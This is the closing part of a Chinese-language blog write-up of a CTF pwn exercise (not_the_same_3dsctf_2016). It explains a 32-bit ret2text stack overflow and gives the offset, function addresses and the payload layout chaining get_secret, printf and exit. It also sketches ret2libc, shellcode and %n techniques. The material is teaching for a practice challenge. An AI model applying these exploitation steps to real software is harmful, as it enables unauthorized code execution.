+<td>gdb</td>
+<td><code>p get_secret</code> &#x2F; <code>info address</code></td>
+<td>调试时确认</td>
+</tr>
+</tbody></table>
+<p>本题是 <code>not stripped</code>，符号表完整，所以 <code>ELF</code> 和 <code>readelf</code> 都能直接拿到名字。如果是 stripped 的静态程序，就只能靠 IDA 或特征字符串定位。</p>
+<h3 id="6-32-位要不要栈对齐"><a href="#6-32-位要不要栈对齐" class="headerlink" title="6. 32 位要不要栈对齐"></a>6. 32 位要不要栈对齐</h3><p>64 位 SysV ABI 要求 <code>call</code> 前 <code>rsp % 16 == 0</code>，不对齐会在 <code>movaps</code> 上崩。32 位 i386 的 ABI 只要求 4 字节对齐，大多数 32 位 glibc 函数不依赖 16 字节对齐，所以这题不用额外处理。</p>
+<p>如果真遇到 32 位程序在 <code>printf</code> 里崩，可以试试在链里加一个 <code>ret</code> gadget，按 4 字节的倍数调整 <code>esp</code>。但这属于少数情况，先跑通再说。</p>
+<h3 id="7-远程连接"><a href="#7-远程连接" class="headerlink" title="7. 远程连接"></a>7. 远程连接</h3><p>平台的 <code>tcp-ctf2</code> 入口套了 TLS，所以：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io = remote(HOST, PORT, ssl=<span class="literal">True</span>, sni=HOST)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>ssl=True</code>：启用 TLS；</li>
+<li><code>sni=HOST</code>：SNI 写主机名，证书校验&#x2F;路由需要；</li>
+<li>端口通常是 <code>9999</code>，以平台为准。</li>
+</ul>
+<p>如果是普通 <code>nc</code> 靶场，直接 <code>remote(HOST, PORT)</code>，不要加 <code>ssl=True</code>，否则会握手失败。</p>
+<h3 id="8-如果-get-secret-不存在怎么办"><a href="#8-如果-get-secret-不存在怎么办" class="headerlink" title="8. 如果 get_secret 不存在怎么办"></a>8. 如果 get_secret 不存在怎么办</h3><p>这题运气好，程序里既有读 flag 的函数，又有 <code>printf</code>。如果没有现成的读文件函数，就得自己构造更长的 ROP 链：</p>
+<table>
+<thead>
+<tr>
+<th>情况</th>
+<th>思路</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>有 <code>system</code>，没有 <code>/bin/sh</code></td>
+<td>往可写内存写 <code>/bin/sh</code>，再调 <code>system</code></td>
+</tr>
+<tr>
+<td>没有 <code>system</code></td>
+<td>ret2libc：泄露 libc 地址，算 <code>system</code> 和 <code>/bin/sh</code></td>
+</tr>
+<tr>
+<td>静态链接、函数齐全</td>
+<td>直接拼 <code>open</code> &#x2F; <code>read</code> &#x2F; <code>write</code> 系统调用</td>
+</tr>
+<tr>
+<td>有格式化字符串</td>
+<td>用 <code>%n</code> 写内存，再跳转</td>
+</tr>
+<tr>
+<td>NX 关闭</td>
+<td>往栈上写 shellcode，跳到栈</td>
+</tr>
+</tbody></table>
+<p>这题是“函数齐全但缺一步输出”的典型，正好用来练“给函数喂参数”。</p>
+<h2 id="新手常见问题"><a href="#新手常见问题" class="headerlink" title="新手常见问题"></a>新手常见问题</h2><div class="note info flat"><p><strong>Q1：为什么直接跳 <code>get_secret</code> 没有输出？</strong></p>
+<p><code>get_secret</code> 只做三件事：<code>fopen</code>、<code>fgets</code> 到全局变量 <code>fl4g</code>、<code>fclose</code>。它没有调用任何输出函数，所以 flag 只是在内存里，屏幕上什么都看不到。必须再调用 <code>printf(fl4g)</code> 才能打印。</p>
+</div>
+
+<div class="note info flat"><p><strong>Q2：为什么偏移是 45，不是 <code>0x3c = 60</code>？</strong></p>
+<p><code>0x3c</code> 是整个栈帧的大小。<code>gets</code> 写入的缓冲区 <code>v4</code> 在 <code>esp+0xf</code>，返回地址在 <code>esp+0x3c</code>，两者相差 <code>0x3c - 0xf = 0x2d = 45</code>。缓冲区低地址方向的空间不会被 <code>gets</code> 往高地址写，所以不算进偏移。</p>
+</div>
+
+<div class="note info flat"><p><strong>Q3：为什么 <code>printf</code> 的参数放在 <code>exit</code> 后面？</strong></p>
+<p>cdecl 下，<code>printf</code> 被 <code>ret</code> 进去时，<code>[esp]</code> 是返回地址，<code>[esp+4]</code> 才是第一个参数。payload 里 <code>EXIT</code> 是返回地址，<code>FL4G</code> 紧跟在它后面，正好落在 <code>[esp+4]</code>。</p>
+</div>
+
+<div class="note info flat"><p><strong>Q4：为什么必须用 <code>exit</code> 收尾？不加会怎样？</strong></p>
+<p><code>printf</code> 的输出在 stdio 缓冲区里，socket 通常是全缓冲。如果 <code>printf</code> 之后程序跳到一个垃圾地址崩溃，缓冲区可能没刷新，远程就收不到 flag。<code>exit</code> 会先刷新缓冲区再终止进程。不加 <code>exit</code> 也可能偶尔能看到，但不稳定。</p>
+</div>
+
+<div class="note info flat"><p><strong>Q5：<code>get_secret</code> 返回后怎么就到 <code>printf</code> 了？</strong></p>
+<p><code>get_secret</code> 的 <code>ret</code> 从栈顶弹出返回地址。我们在 <code>get_secret</code> 上面放的是 <code>printf</code>，所以它返回到 <code>printf</code>。此时栈顶是 <code>exit</code>（<code>printf</code> 的返回地址），下一个是 <code>fl4g</code>（<code>printf</code> 的参数）。</p>
+</div>
+
+<div class="note info flat"><p><strong>Q6：<code>printf</code> 的地址 <code>0x804f0a0</code> 是怎么来的？</strong></p>
+<p><code>main</code> 的汇编里有一句 <code>call 0x804f0a0 &lt;printf&gt;</code>，这就是 <code>printf</code> 的入口。程序是静态链接 + No PIE，所以这个地址在远程也是同一个。</p>
+</div>
+
+<div class="note info flat"><p><strong>Q7：为什么不用 <code>system(&quot;cat flag.txt&quot;)</code>？</strong></p>
+<p>因为这题的程序里没有现成的 <code>system(&quot;cat flag.txt&quot;)</code> 后门。有 <code>get_secret</code> 和 <code>printf</code>，就按现有的函数拼调用链；强行找 <code>system</code> 反而要泄露 libc 或构造更长的 ROP。</p>
+</div>
+
+<div class="note info flat"><p><strong>Q8：gdb 里 <code>b *main+22</code> 和 <code>b *main+32</code> 是什么？</strong></p>
+<p><code>main+22</code> 是 <code>call gets</code> 那条指令的地址 <code>0x80489f6</code>，停在这里可以输入 payload；<code>main+32</code> 是 <code>ret</code> 的地址 <code>0x8048a00</code>，停在这里可以检查返回地址有没有被覆盖、栈布局对不对。</p>
+</div>
+
+<div class="note info flat"><p><strong>Q9：32 位需要处理栈对齐吗？</strong></p>
+<p>i386 的 ABI 只要求 4 字节对齐，大多数 32 位 glibc 函数不依赖 16 字节对齐，所以这题不用。如果遇到 <code>printf</code> 内部崩溃，再考虑加 <code>ret</code> gadget 调整，但这种情况在 32 位里少见。</p>
+</div>
+
+<div class="note info flat"><p><strong>Q10：静态链接和动态链接有什么区别？</strong></p>
+<p>静态链接把 libc 代码直接打进可执行文件，函数地址固定，不依赖外部 <code>.so</code>；动态链接在运行时加载 <code>libc.so.6</code>，函数地址受 ASLR 影响，通常要先泄露 libc 基址。本题是静态链接，所以 <code>printf</code>、<code>exit</code> 的地址可以直接写死。</p>
+</div>
+
+<div class="note info flat"><p><strong>Q11：flag 读进全局变量，为什么不用栈地址？</strong></p>
+<p>因为 <code>get_secret</code> 里 <code>fgets</code> 的目标是 <code>0x80eca2d</code>，这是全局变量 <code>fl4g</code> 的地址，No PIE 下固定不变。用全局地址比用栈地址稳定：栈地址有 ASLR，而且 <code>get_secret</code> 返回后局部栈帧就失效了。</p>
+</div>
+
+<div class="note info flat"><p><strong>Q12：远程连不上怎么办？</strong></p>
+<p>先确认三件事：主机名是不是 <code>*.tcp-ctf2.dasctf.com</code>、端口是不是 <code>9999</code>、<code>remote</code> 有没有写 <code>ssl=True, sni=HOST</code>。平台地址是临时的，过期失效很正常，换一个新环境再试。</p>
+</div>
+
+<h2 id="完整流程速查"><a href="#完整流程速查" class="headerlink" title="完整流程速查"></a>完整流程速查</h2><table>
+<thead>
+<tr>
+<th>步骤</th>
+<th>目的</th>
+<th>操作</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>看文件类型</td>
+<td><code>file pwn7</code>，确认 32 位、静态链接、not stripped</td>
+</tr>
+<tr>
+<td>2</td>
+<td>看保护</td>
+<td><code>checksec --file=pwn7</code>，No canary、NX enabled、No PIE</td>
+</tr>
+<tr>
+<td>3</td>
+<td>看 main</td>
+<td><code>sub esp,0x3c</code>，<code>v4</code> 在 <code>esp+0xf</code>，<code>gets(v4)</code></td>
+</tr>
+<tr>
+<td>4</td>
+<td>算偏移</td>
+<td><code>0x3c - 0xf = 0x2d = 45</code>（无保存 ebp）</td>
+</tr>
+<tr>
+<td>5</td>
+<td>看 get_secret</td>
+<td><code>fgets(&amp;fl4g, 45, fp)</code>，不打印，<code>fl4g</code> 在 <code>0x80eca2d</code></td>
+</tr>
+<tr>
+<td>6</td>
+<td>找 printf</td>
+<td><code>main</code> 里 <code>call 0x804f0a0 &lt;printf&gt;</code></td>
+</tr>
+<tr>
+<td>7</td>
+<td>找 exit</td>
+<td><code>objdump -d ./pwn7 | grep -i exit</code>，得到 <code>0x0804e660</code></td>
+</tr>
+<tr>
+<td>8</td>
+<td>画栈图</td>
+<td><code>[45 填充][get_secret][printf][exit][fl4g]</code></td>
+</tr>
+<tr>
+<td>9</td>
+<td>写 exp</td>
+<td><code>padding + p32(get_secret) + p32(printf) + p32(exit) + p32(fl4g)</code></td>
+</tr>
+<tr>
+<td>10</td>
+<td>gdb 验证</td>
+<td>在 <code>main+32</code> 停住，<code>telescope $esp</code> 看四个槽</td>
+</tr>
+<tr>
+<td>11</td>
+<td>打远程</td>
+<td><code>remote(HOST, 9999, ssl=True, sni=HOST)</code>，拿 flag</td>
+</tr>
+</tbody></table>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这道题把 32 位 ret2text 的完整链路走了一遍，几个知识点值得反复看：</p>
+<ul>
+<li><strong>后门不一定会打印</strong>：<code>get_secret</code> 只读文件，不输出；要自己找 <code>printf</code>，把 <code>fl4g</code> 的地址喂给它；</li>
+<li><strong>32 位参数走栈</strong>：cdecl 下 <code>[esp]</code> 是返回地址，<code>[esp+4]</code> 是第一个参数，手工搭调用栈就是按这个形状摆；</li>
+<li><strong>偏移对着汇编算</strong>：<code>0x3c - 0xf = 45</code>，不是整个栈帧的 60，也不是上一个 32 位题的 56；</li>
+<li><strong>没有 <code>push ebp</code> 就没有保存的 ebp</strong>：函数用 <code>esp</code> 寻址时，45 字节之后直接是返回地址；</li>
+<li><strong>函数序言会移动 <code>esp</code></strong>：<code>get_secret</code> 的 <code>push esi; sub esp,0x18</code> 是配平的，不影响我们摆好的返回地址链；</li>
+<li><strong>打印型后门要收尾</strong>：<code>printf</code> 的输出在 stdio 缓冲区里，<code>exit</code> 会刷新缓冲区再退出，<code>_exit</code> 不会；</li>
+<li><strong>静态链接 + No PIE 很省事</strong>：<code>printf</code>、<code>exit</code>、<code>fl4g</code> 的地址都能直接写死，不用泄露 libc；</li>
+<li><strong>gdb 验证不能省</strong>：<code>telescope $esp</code> 一眼就能看出四个槽对不对。</li>
+</ul>
+<p>下一题可以往这几个方向走：</p>
+<table>
+<thead>
+<tr>
+<th>方向</th>
+<th>要解决的问题</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>32 位 + canary</td>
+<td>先泄露 canary，再覆盖返回地址</td>
+</tr>
+<tr>
+<td>32 位 + PIE</td>
+<td>先泄露程序基址，再算真实地址</td>
+</tr>
+<tr>
+<td>动态链接的 32 位</td>
+<td>ret2libc：泄露 libc 地址，找 <code>system</code> 和 <code>/bin/sh</code></td>
+</tr>
+<tr>
+<td>没有现成读取函数</td>
+<td>拼 <code>open</code> &#x2F; <code>read</code> &#x2F; <code>write</code> 系统调用链</td>
+</tr>
+<tr>
+<td>参数更多的函数</td>
+<td>继续往栈上摆，注意返回地址和参数的相对位置</td>
+</tr>
+<tr>
+<td>格式化字符串</td>
+<td>用 <code>%n</code> 写内存，配合任意地址读写</td>
+</tr>
+</tbody></table>
+<div class="note success flat"><p><strong>一条经验</strong>：pwn 题先问三个问题——<strong>漏洞在哪、能控制什么、程序里已经有什么</strong>。这道题的答案分别是 <code>gets</code>、返回地址、<code>get_secret</code> + <code>printf</code>。把这三个答案拼起来，payload 自然就出来了。工具只是手，栈图才是关键。</p>
+</div>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a target="_blank" rel="noopener" href="https://github.com/Quellisya">Quellisya</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://quellisya.github.io/2026/11/14/pwn-ctf-not-the-same-3dsctf-2016/">https://quellisya.github.io/2026/11/14/pwn-ctf-not-the-same-3dsctf-2016/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://Quellisya.github.io" target="_blank">Quellisya's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Pwn/">Pwn</a><a class="post-meta__tags" href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/">栈溢出</a><a class="post-meta__tags" href="/tags/ret2text/">ret2text</a><a class="post-meta__tags" href="/tags/32%E4%BD%8D/">32位</a><a class="post-meta__tags" href="/tags/cdecl/">cdecl</a><a class="post-meta__tags" href="/tags/pwntools/">pwntools</a><a class="post-meta__tags" href="/tags/gdb/">gdb</a><a class="post-meta__tags" href="/tags/pwndbg/">pwndbg</a><a class="post-meta__tags" href="/tags/3dsctf2016/">3dsctf2016</a><a class="post-meta__tags" href="/tags/gets/">gets</a><a class="post-meta__tags" href="/tags/printf/">printf</a><a class="post-meta__tags" href="/tags/exit/">exit</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar-seal.svg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/11/14/web-ctf-http-geek2019/" title="[极客大挑战 2019] Http：Referer、User-Agent、X-Forwarded-For，以及被反向代理吞掉的那一步"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">[极客大挑战 2019] Http：Referer、User-Agent、X-Forwarded-For，以及被反向代理吞掉的那一步</div></div><div class="info-2"><div class="info-item-1">从 F12 里的隐藏链接开始，依次伪造 Referer、User-Agent、X-Forwarded-For。网上大多数 writeup 到 XFF 就结束了，但在 CTF2 的 openresty 网关后面这一步会失败：反代把 XFF 重写成了真实客户端 IP。改用 tcp-ctf2 直连、把 Burp 端口改成 9999 并勾上 HTTPS，就能绕过网关拿到 flag。顺便讲清楚请求头的信任边界和反代改写的原理。</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/11/10/pwn-ctf-get-started-3dsctf-2016/" title="Pwn 入门：get_started_3dsctf_2016——32 位栈传参、cdecl 与用 exit 收尾"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-11-10</div><div class="info-item-2">Pwn 入门：get_started_3dsctf_2016——32 位栈传参、cdecl 与用 exit 收尾</div></div><div class="info-2"><div class="info-item-1">从 64 位切到 32 位的第一道 ret2text：用 file / checksec 判断位数和静态链接，在 IDA 里看懂 sub esp,0x3c 与 56 字节偏移，按 cdecl 规则把 get_flag 的两个参数摆到栈上，讲清楚 [esp+0x10] / [esp+0x14] 的来历、为什么必须再返回到 exit，最后用 gdb 的 telescope 亲眼确认栈布局。</div></div></div></a><a class="pagination-related" href="/2026/11/06/pwn-ctf-ciscn-2019-n-1/" title="Pwn 入门：CISCN 2019 n_1——溢出 44 字节把 v2 改成 11.28125，并用 gdb 亲眼验证"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-11-06</div><div class="info-item-2">Pwn 入门：CISCN 2019 n_1——溢出 44 字节把 v2 改成 11.28125，并用 gdb 亲眼验证</div></div><div class="info-2"><div class="info-item-1">从 file / checksec 到 IDA 伪代码，讲清楚这题为什么不打返回地址而是改写相邻的 float v2：44 字节偏移怎么算、11.28125 为什么在内存里是 00 80 34 41、struct.pack('<f', ...) 和 p32(0x41348000) 是什么关系，最后用 pwntools 的 gdb.debug 单步到 gets 之后，在 xmm0 和栈上确认 payload 真的覆盖成功。</div></div></div></a><a class="pagination-related" href="/2026/11/02/pwn-ctf-rip/" title="Pwn 工具的基本使用：从搭环境到 BUUCTF rip 拿 shell"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-11-02</div><div class="info-item-2">Pwn 工具的基本使用：从搭环境到 BUUCTF rip 拿 shell</div></div><div class="info-2"><div class="info-item-1">从零把 pwn 环境搭好（gdb、pwndbg、pwntools、ROPgadget、one_gadget），再用 BUUCTF rip 走完第一道栈溢出：找后门、算偏移、处理栈对齐、写 exp 拿 shell。</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar-seal.svg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Quellisya</div><div class="author-info-description">记录 CTF 与 Web 安全的学习笔记，把每一步讲清楚。</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">32</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">98</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">18</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Quellisya"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Quellisya" target="_blank" title="Github"><i class="fab fa-github" style="color: #0f2f32;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">循墨迹读代码，借微光见漏洞。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%99%E9%81%93%E9%A2%98%E4%B8%BA%E4%BB%80%E4%B9%88%E5%80%BC%E5%BE%97%E5%81%9A"><span class="toc-text">这道题为什么值得做</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9Afile-%E4%B8%8E-checksec"><span class="toc-text">第一步：file 与 checksec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9AIDA-%E7%9C%8B-main%EF%BC%8C%E7%AE%97%E5%81%8F%E7%A7%BB"><span class="toc-text">第二步：IDA 看 main，算偏移</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#45-%E6%98%AF%E6%80%8E%E4%B9%88%E7%AE%97%E5%87%BA%E6%9D%A5%E7%9A%84"><span class="toc-text">45 是怎么算出来的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E6%B2%A1%E6%9C%89%E4%BF%9D%E5%AD%98%E7%9A%84-ebp"><span class="toc-text">为什么没有保存的 ebp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%BB%E6%88%90%E6%A0%88%E5%9B%BE"><span class="toc-text">画成栈图</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8-gdb-%E9%87%8C%E9%AA%8C%E8%AF%81"><span class="toc-text">在 gdb 里验证</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9Aget-secret-%E5%8F%AA%E8%AF%BB%E4%B8%8D%E6%89%93%E5%8D%B0"><span class="toc-text">第三步：get_secret 只读不打印</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E6%89%BE-printf-%E5%92%8C-exit"><span class="toc-text">第四步：找 printf 和 exit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#printf-%E7%9A%84%E5%9C%B0%E5%9D%80"><span class="toc-text">printf 的地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exit-%E7%9A%84%E5%9C%B0%E5%9D%80"><span class="toc-text">exit 的地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81-exit"><span class="toc-text">为什么需要 exit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9A%E7%94%BB%E6%A0%88%E5%9B%BE%EF%BC%8C%E5%86%99-payload"><span class="toc-text">第五步：画栈图，写 payload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%88%E7%90%86%E6%B8%85-cdecl-%E7%9A%84%E8%B0%83%E7%94%A8%E5%BD%A2%E7%8A%B6"><span class="toc-text">先理清 cdecl 的调用形状</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E6%A0%87%E9%93%BE"><span class="toc-text">目标链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99-exp"><span class="toc-text">写 exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%85%AD%E6%AD%A5%EF%BC%9Agdb-%E9%AA%8C%E8%AF%81%E6%A0%88%E5%B8%83%E5%B1%80"><span class="toc-text">第六步：gdb 验证栈布局</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%83%E6%AD%A5%EF%BC%9A%E6%89%93%E8%BF%9C%E7%A8%8B%EF%BC%8C%E6%8B%BF-flag"><span class="toc-text">第七步：打远程，拿 flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E6%9C%80%E5%90%8E%E6%98%AF-EOF%EF%BC%8C%E4%B8%8D%E6%98%AF-shell"><span class="toc-text">为什么最后是 EOF，不是 shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%E8%A1%A5%E5%85%85"><span class="toc-text">知识点补充</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-32-%E4%BD%8D-cdecl-%E7%9A%84%E8%B0%83%E7%94%A8%E6%A0%88"><span class="toc-text">1. 32 位 cdecl 的调用栈</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-ret2text%E3%80%81%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E3%80%81NX%E3%80%81PIE"><span class="toc-text">2. ret2text、静态链接、NX、PIE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%81%8F%E7%A7%BB%E8%AE%A1%E7%AE%97%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88%E6%98%AF-45"><span class="toc-text">3. 偏移计算：为什么是 45</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-printf-%E7%9A%84%E7%BC%93%E5%86%B2%E5%8C%BA%E5%92%8C-exit"><span class="toc-text">4. printf 的缓冲区和 exit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E6%89%BE%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95"><span class="toc-text">5. 找函数地址的几种方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-32-%E4%BD%8D%E8%A6%81%E4%B8%8D%E8%A6%81%E6%A0%88%E5%AF%B9%E9%BD%90"><span class="toc-text">6. 32 位要不要栈对齐</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5"><span class="toc-text">7. 远程连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E5%A6%82%E6%9E%9C-get-secret-%E4%B8%8D%E5%AD%98%E5%9C%A8%E6%80%8E%E4%B9%88%E5%8A%9E"><span class="toc-text">8. 如果 get_secret 不存在怎么办</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B0%E6%89%8B%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98"><span class="toc-text">新手常见问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E6%B5%81%E7%A8%8B%E9%80%9F%E6%9F%A5"><span class="toc-text">完整流程速查</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-text">小结</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/11/14/pwn-ctf-not-the-same-3dsctf-2016/" title="Pwn 入门：not_the_same_3dsctf_2016——45 字节偏移、32 位栈传参与用 printf 收尾">Pwn 入门：not_the_same_3dsctf_2016——45 字节偏移、32 位栈传参与用 printf 收尾</a><time datetime="2026-11-14T07:00:00.000Z" title="发表于 2026-11-14 15:00:00">2026-11-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/11/14/web-ctf-http-geek2019/" title="[极客大挑战 2019] Http：Referer、User-Agent、X-Forwarded-For，以及被反向代理吞掉的那一步">[极客大挑战 2019] Http：Referer、User-Agent、X-Forwarded-For，以及被反向代理吞掉的那一步</a><time datetime="2026-11-14T03:00:00.000Z" title="发表于 2026-11-14 11:00:00">2026-11-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/11/14/web-knowledge-php-common-vulns/" title="PHP 常见漏洞笔记：数组报错绕过、Cookie 信任与 php://filter 读源码">PHP 常见漏洞笔记：数组报错绕过、Cookie 信任与 php://filter 读源码</a><time datetime="2026-11-14T01:00:00.000Z" title="发表于 2026-11-14 09:00:00">2026-11-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/11/12/web-ctf-sql-bool-blind/" title="[CISCN2019 华北赛区 Day2 Web1] Hack World：空格被过滤后的布尔盲注与二分查找">[CISCN2019 华北赛区 Day2 Web1] Hack World：空格被过滤后的布尔盲注与二分查找</a><time datetime="2026-11-12T02:00:00.000Z" title="发表于 2026-11-12 10:00:00">2026-11-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/11/10/pwn-ctf-get-started-3dsctf-2016/" title="Pwn 入门：get_started_3dsctf_2016——32 位栈传参、cdecl 与用 exit 收尾">Pwn 入门：get_started_3dsctf_2016——32 位栈传参、cdecl 与用 exit 收尾</a><time datetime="2026-11-10T02:00:00.000Z" title="发表于 2026-11-10 10:00:00">2026-11-10</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Quellisya</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.2</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.7.0</a></span></div><div class="footer_custom_text">以墨为舟，以码为桨 · CTF & Web Security Notes</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.7.0"></script><script src="/js/main.js?v=5.7.0"></script><div class="js-pjax"></div><script defer src="/js/butterfly-custom.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索笔记、题目或 payload…" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script 